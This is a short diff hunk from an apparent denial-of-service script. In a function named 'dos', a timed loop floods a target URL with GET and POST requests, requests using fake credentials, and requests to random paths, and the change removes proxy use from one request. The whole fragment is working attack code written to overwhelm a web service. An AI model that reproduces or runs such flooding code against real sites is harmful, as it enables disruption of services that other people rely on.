@@ -49,7 +49,7 @@ def dos(url, tm, prx):
 	else:
 		while time.monotonic() - t <= tm:
 			try:
-				requests.get(url, proxies = proxies)
+				requests.get(url)
 				requests.post(url, headers = header, json = payload)
 				requests.get(url, auth=('username', 'fakepass'))
 				requests.get(url + '/' + random.choice(lib))
